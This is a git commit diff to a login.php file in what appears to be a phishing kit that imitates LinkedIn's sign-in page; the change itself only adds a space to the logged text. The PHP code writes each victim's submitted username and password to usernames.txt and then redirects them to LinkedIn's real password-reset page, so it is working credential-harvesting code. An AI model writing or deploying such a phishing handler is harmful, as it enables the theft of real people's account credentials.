bee6160348282f41eb51cb44bf0f61aa39a562ed
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 19:05:42 +0600

    Update login.php

--- websites/linkedin/login.php
+++ websites/linkedin/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Username: " . $_POST['username'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.linkedin.com/uas/request-password-reset');
 exit();
